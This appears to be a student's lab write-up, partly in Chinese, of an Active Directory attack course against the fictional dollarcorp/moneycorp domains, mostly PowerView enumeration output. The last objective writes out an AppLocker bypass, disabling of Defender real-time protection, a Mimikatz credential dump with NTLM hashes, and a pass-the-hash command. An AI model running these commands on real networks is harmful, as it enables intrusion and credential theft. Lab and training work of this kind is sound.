# Learning Objective 1:
Task
● Enumerate following for the dollarcorp domain:
− Users
− Computers
− Domain Administrators
− Enterprise Administrators
− Shares

## Users
```
PS C:\ad> Get-NetUser |select cn

cn
--
Administrator
Guest
DefaultAccount
krbtgt
ci admin
sql admin
web svc
srv admin
app admin
mgmt admin
svc admin
studentadmin
sql1 admin
test da
Control359User
Control360User
Control361User
Control362User
Control363User
Control364User
Control365User
Control366User
Control367User
Control368User
Control369User
Control370User
Support359User
Support360User
Support361User
Support362User
Support363User
Support364User
Support365User
Support366User
Support367User
Support368User
Support369User
Support370User
VPN359User
VPN360User
VPN361User
VPN362User
VPN363User
VPN364User
VPN365User
VPN366User
VPN367User
VPN368User
VPN369User
VPN370User
student359
student360
student361
student362
student363
student364
student365
student366
student367
student368
student369
student370
```

## Computers
```
PS C:\ad> Get-NetComputer
dcorp-dc.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-ci.dollarcorp.moneycorp.local
dcorp-mssql.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
dcorp-sql1.dollarcorp.moneycorp.local
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
mcorp-std366.dollarcorp.moneycorp.local
```


## Domain Administrators
```
PS C:\ad> Get-NetGroupMember -GroupName "Domain Admins" -Recurse


GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : svcadmin
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-1122
IsGroup      : False
MemberDN     : CN=svc admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local

GroupDomain  : dollarcorp.moneycorp.local
GroupName    : Domain Admins
MemberDomain : dollarcorp.moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-1874506631-3219952063-538504511-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
```

## Enterprise Administrators
```
PS C:\ad> Get-NetGroupMember -GroupName "Enterprise Admins" -domain moneycorp.local  -Recurse


GroupDomain  : moneycorp.local
GroupName    : Enterprise Admins
MemberDomain : moneycorp.local
MemberName   : Administrator
MemberSID    : S-1-5-21-280534878-1496970234-700767426-500
IsGroup      : False
MemberDN     : CN=Administrator,CN=Users,DC=moneycorp,DC=local
```


## Shares
```
PS C:\ad> Invoke-ShareFinder
\\dcorp-std364.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std364.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std364.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std364.dollarcorp.moneycorp.local\shared        -
\\dcorp-mgmt.dollarcorp.moneycorp.local\ADMIN$  - Remote Admin
\\dcorp-mgmt.dollarcorp.moneycorp.local\C$      - Default share
\\dcorp-mgmt.dollarcorp.moneycorp.local\IPC$    - Remote IPC
\\dcorp-std370.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std370.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std370.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std370.dollarcorp.moneycorp.local\shared        -
\\dcorp-std366.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std366.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std366.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std366.dollarcorp.moneycorp.local\shared        -
\\dcorp-std368.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std368.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std368.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std368.dollarcorp.moneycorp.local\shared        -
\\dcorp-stdadm.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-stdadm.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-stdadm.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-stdadm.dollarcorp.moneycorp.local\shared        -
\\dcorp-std369.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std369.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std369.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std369.dollarcorp.moneycorp.local\shared        -
\\dcorp-std359.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std359.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std359.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std359.dollarcorp.moneycorp.local\shared        -
\\dcorp-adminsrv.dollarcorp.moneycorp.local\ADMIN$      - Remote Admin
\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$  - Default share
\\dcorp-adminsrv.dollarcorp.moneycorp.local\IPC$        - Remote IPC
\\dcorp-sql1.dollarcorp.moneycorp.local\ADMIN$  - Remote Admin
\\dcorp-sql1.dollarcorp.moneycorp.local\C$      - Default share
\\dcorp-sql1.dollarcorp.moneycorp.local\IPC$    - Remote IPC
\\dcorp-std367.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std367.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std367.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std367.dollarcorp.moneycorp.local\shared        -
\\dcorp-std363.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-std363.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-std363.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-std363.dollarcorp.moneycorp.local\shared        -
\\dcorp-ci.dollarcorp.moneycorp.local\ADMIN$    - Remote Admin
\\dcorp-ci.dollarcorp.moneycorp.local\C$        - Default share
\\dcorp-ci.dollarcorp.moneycorp.local\IPC$      - Remote IPC
\\dcorp-appsrv.dollarcorp.moneycorp.local\ADMIN$        - Remote Admin
\\dcorp-appsrv.dollarcorp.moneycorp.local\C$    - Default share
\\dcorp-appsrv.dollarcorp.moneycorp.local\IPC$  - Remote IPC
\\dcorp-mssql.dollarcorp.moneycorp.local\ADMIN$         - Remote Admin
\\dcorp-mssql.dollarcorp.moneycorp.local\C$     - Default share
\\dcorp-mssql.dollarcorp.moneycorp.local\IPC$   - Remote IPC
\\dcorp-dc.dollarcorp.moneycorp.local\ADMIN$    - Remote Admin
\\dcorp-dc.dollarcorp.moneycorp.local\C$        - Default share
\\dcorp-dc.dollarcorp.moneycorp.local\IPC$      - Remote IPC
\\dcorp-dc.dollarcorp.moneycorp.local\NETLOGON  - Logon server share
\\dcorp-dc.dollarcorp.moneycorp.local\SYSVOL    - Logon server share
```


# Learning Objective 2:
Task
● Enumerate following for the dollarcorp domain:
− List all the OUs
− List all the computers in the StudentMachines OU.
− List the GPOs
− Enumerate GPO applied on the StudentMachines OU.


## List all the OUs
```
PS C:\ad> Get-NetOU
LDAP://OU=Domain Controllers,DC=dollarcorp,DC=moneycorp,DC=local
LDAP://OU=Applocked,DC=dollarcorp,DC=moneycorp,DC=local
LDAP://OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
LDAP://OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
```

## List all the computers in the StudentMachines OU
```
PS C:\ad> Get-NetOU StudentMachines | %{Get-NetComputer -ADSPath $_}
dcorp-stdadm.dollarcorp.moneycorp.local
dcorp-std359.dollarcorp.moneycorp.local
dcorp-std360.dollarcorp.moneycorp.local
dcorp-std361.dollarcorp.moneycorp.local
dcorp-std362.dollarcorp.moneycorp.local
dcorp-std363.dollarcorp.moneycorp.local
dcorp-std364.dollarcorp.moneycorp.local
dcorp-std365.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-std367.dollarcorp.moneycorp.local
dcorp-std368.dollarcorp.moneycorp.local
dcorp-std369.dollarcorp.moneycorp.local
dcorp-std370.dollarcorp.moneycorp.local
```

## List the GPOs
```
PS C:\ad> Get-NetGPO


usncreated               : 8016
systemflags              : -1946157056
displayname              : Default Domain Policy
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A
                           4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}]
whenchanged              : 2/17/2019 7:14:30 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 13009
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {31B2F340-016D-11D2-945F-00C04FB984F9}
adspath                  : LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {31B2F340-016D-11D2-945F-00C04FB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
distinguishedname        : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 7:00:13 AM
versionnumber            : 3
instancetype             : 4
objectguid               : cd0c7024-e03a-4369-958b-9c93fbd25649
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 8019
systemflags              : -1946157056
displayname              : Default Domain Controllers Policy
gpcmachineextensionnames : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 2/18/2019 11:09:29 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 39159
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {6AC1786C-016F-11D2-945F-00C04fB984F9}
adspath                  : LDAP://CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {6AC1786C-016F-11D2-945F-00C04fB984F9}
iscriticalsystemobject   : True
gpcfilesyspath           : \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
distinguishedname        : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 7:00:13 AM
versionnumber            : 3
instancetype             : 4
objectguid               : 800516c0-1d9d-4cc6-aeae-7b30fae46799
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 14716
displayname              : Applocker
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{62C1845D-C4A6-4ACB-BBB0-C895FD090385}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D
                           0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:21:07 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123116
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
adspath                  : LDAP://CN={211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D}
distinguishedname        : CN={211A25B2-03AD-4E5E-9C6A-AFEFE66EFB2D},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/17/2019 1:44:15 PM
versionnumber            : 21
instancetype             : 4
objectguid               : 06b004fe-5da8-4765-83c6-595fd1af5bcf
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 65523
displayname              : Servers
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:21:47 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123130
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {C4F31C31-6258-4991-AAAD-454934E882AE}
adspath                  : LDAP://CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {C4F31C31-6258-4991-AAAD-454934E882AE}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{C4F31C31-6258-4991-AAAD-454934E882AE}
distinguishedname        : CN={C4F31C31-6258-4991-AAAD-454934E882AE},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 6:53:55 AM
versionnumber            : 10
instancetype             : 4
objectguid               : 85432932-9ec6-47ea-9709-92ad11bd3e89
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local

usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

## Enumerate GPO applied on the StudentMachines OU
这里分两步

先获取StudentMachines里OU值里的gplink这个字段的值
```
PS C:\ad>  (Get-NetOU StudentMachines -FullData).gplink
[LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local;0]
```

以上面的gplink作为传入参数，查询符合这个条件的所有GPO

```
PS C:\ad> Get-NetGPO -ADSpath 'LDAP://cn={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},cn=policies,cn=system,DC=dollarcorp,DC=moneycorp,DC=local'


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

或者

```
PS C:\ad> Get-NetGPO -GPOname "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"


usncreated               : 65831
displayname              : Students
gpcmachineextensionnames : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]
whenchanged              : 4/20/2019 6:22:16 AM
objectclass              : {top, container, groupPolicyContainer}
gpcfunctionalityversion  : 2
showinadvancedviewonly   : True
usnchanged               : 123144
dscorepropagationdata    : {5/3/2020 9:04:05 AM, 2/21/2019 12:17:00 PM, 2/19/2019 1:04:02 PM, 2/19/2019 12:55:49 PM...}
name                     : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
adspath                  : LDAP://CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
flags                    : 0
cn                       : {3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
gpcfilesyspath           : \\dollarcorp.moneycorp.local\SysVol\dollarcorp.moneycorp.local\Policies\{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}
distinguishedname        : CN={3E04167E-C2B6-4A9A-8FB7-C811158DC97C},CN=Policies,CN=System,DC=dollarcorp,DC=moneycorp,DC=local
whencreated              : 2/19/2019 7:04:25 AM
versionnumber            : 8
instancetype             : 4
objectguid               : 8ecdfe44-b617-4b9e-a9f9-4d548e5dc7b1
objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
```

# Learning Objective 3:
Task
● Enumerate following for the dollarcorp domain:
− ACL for the Users group
− ACL for the Domain Admins group
− All modify rights/permissions for the studentx


## ACL for the Users group

```
PS C:\ad> Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs


InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SELF
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

InheritedObjectType   : All
ObjectDN              : CN=Users,CN=Builtin,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-32-545

<skip>
```

## ACL for the Domain Admins group
```
PS C:\ad> Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs


InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\Authenticated Users
IsInherited           : False
ActiveDirectoryRights : GenericRead
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512

InheritedObjectType   : All
ObjectDN              : CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
ObjectType            : All
IdentityReference     : NT AUTHORITY\SYSTEM
IsInherited           : False
ActiveDirectoryRights : GenericAll
PropagationFlags      : None
ObjectFlags           : None
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-1874506631-3219952063-538504511-512
```

## All modify rights/permissions for the studentx

枚举用户sudent366所有modify权限
```
 Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "sudent366"}
```


# Learning Objective 4:
Task
● Enumerate all domains in the moneycorp.local forest.
● Map the trusts of the dollarcorp.moneycorp.local domain.
● Map External trusts in moneycorp.local forest.
● Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?


## Enumerate all domains in the moneycorp.local forest.
```
PS C:\ad> Get-NetForestDomain -Forest moneycorp.local


Forest                  : moneycorp.local
DomainControllers       : {dcorp-dc.dollarcorp.moneycorp.local}
Children                : {us.dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : moneycorp.local
PdcRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
RidRoleOwner            : dcorp-dc.dollarcorp.moneycorp.local
InfrastructureRoleOwner : dcorp-dc.dollarcorp.moneycorp.local
Name                    : dollarcorp.moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {mcorp-dc.moneycorp.local}
Children                : {dollarcorp.moneycorp.local}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  :
PdcRoleOwner            : mcorp-dc.moneycorp.local
RidRoleOwner            : mcorp-dc.moneycorp.local
InfrastructureRoleOwner : mcorp-dc.moneycorp.local
Name                    : moneycorp.local

Forest                  : moneycorp.local
DomainControllers       : {us-dc.us.dollarcorp.moneycorp.local}
Children                : {}
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : dollarcorp.moneycorp.local
PdcRoleOwner            : us-dc.us.dollarcorp.moneycorp.local
RidRoleOwner            : us-dc.us.dollarcorp.moneycorp.local
InfrastructureRoleOwner : us-dc.us.dollarcorp.moneycorp.local
Name                    : us.dollarcorp.moneycorp.local
```

## Map the trusts of the dollarcorp.moneycorp.local domain.
```
PS C:\ad> Get-NetDomainTrust -Domain dollarcorp.moneycorp.local

SourceName                 TargetName                      TrustType TrustDirection
----------                 ----------                      --------- --------------
dollarcorp.moneycorp.local moneycorp.local               ParentChild  Bidirectional
dollarcorp.moneycorp.local us.dollarcorp.moneycorp.local ParentChild  Bidirectional
dollarcorp.moneycorp.local eurocorp.local                   External  Bidirectional
```

## Map External trusts in moneycorp.local forest.
```
PS C:\ad> Get-NetForestDomain -Verbose | Get-NetDomainTrust | ?{$_.TrustType -eq "External"}

SourceName                 TargetName     TrustType TrustDirection
----------                 ----------     --------- --------------
dollarcorp.moneycorp.local eurocorp.local  External  Bidirectional
```


## Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?

注意上面dollarcorp.moneycorp.local和eurocorp.local的信任关系是Bidirectional（双向）的，所以我们可以从eurocorp.local里提取信息

```
PS C:\ad> Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust

SourceName     TargetName                   TrustType TrustDirection
----------     ----------                   --------- --------------
eurocorp.local eu.eurocorp.local          ParentChild  Bidirectional
eurocorp.local dollarcorp.moneycorp.local    External  Bidirectional
```


# Learning Objective 5:
Task
● Exploit a service on dcorp-studentx and elevate privileges to local administrator.
● Identify a machine in the domain where studentx has local administrative access.
● Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.

## Exploit a service on dcorp-studentx and elevate privileges to local administrator.

略

## Identify a machine in the domain where studentx has local administrative access.

```
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
```


## Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 -the dcorp-ci server.
略


# Learning Objective 6:
Task
● Setup BloodHound and identify a machine where studentx has local administrative access.

略


# Learning Objective 7:
Task
● Domain user on one of the machines has access to a server where a domain admin is logged in.
Identify:
− The domain user
− The server where the domain admin is logged in.
● Escalate privileges to Domain Admin
− Using the method above.
−  Using derivative local admin 


## Domain user on one of the machines has access to a server where a domain admin is logged in.

从BloodHound可以知道svcadmin登录过dcorp-mgmt

## The domain user

svcadmin

## The server where the domain admin is logged in.

dcorp-mgmt


## Escalate privileges to Domain Admin

这里采取横向到dcorp-adminsrv进行域权限提升的方法

枚举dcorp-adminsrv里在所有AppLocker Policy

```
[dcorp-adminsrv]: PS C:\users> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 5a9340f3-f6a7-4892-84ac-0fffd51d9584
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PublisherConditions : {*\O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US\*,*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : 10541a9a-69a9-44e2-a2da-5538234e1ebc
Name                : Signed by O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow
```

只能在PROGRAMFILES和WINDIR下执行所有脚本文件

把一个自执行的mimikatz文件拷贝到PROGRAMFILES下

拷贝一份mimikatz文件，取名为Invoke-mimikatx.ps1,把这行代码加到脚本最下方
```
Invoke-Mimikatz
```

表示加载在时候调用自己

拷贝：
```
copy .\Invoke-Mimikatx.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\"Program Files"\
```

关闭windefend 实时防护
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
```

执行mimikatz
```
[dcorp-adminsrv]: PS C:\Program Files> .\Invoke-Mimikatx.ps1

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

<skip>

```


整理收集在NTML信息
```
srvadmin : a98e18228819e8eec3dfa33cb68b0728
appadmin : d549831a955fee51a43c83efb3928fa7
DCORP-ADMINSRV$ : 5e77978a734e3a7f3895fb0fdbda3b96
websvc : cc098f204c5887eaa8253e7c2749156f
```

开一个srvadmin权限的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
```

查看srvadmin可以横向在计算机
```
PS C:\Windows\system32> cd c:/ad
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
```

从bloodhound中我们知道dcorp-mgmt里有其中一个DA管理员在登陆session，现在我们可以横向进去查看

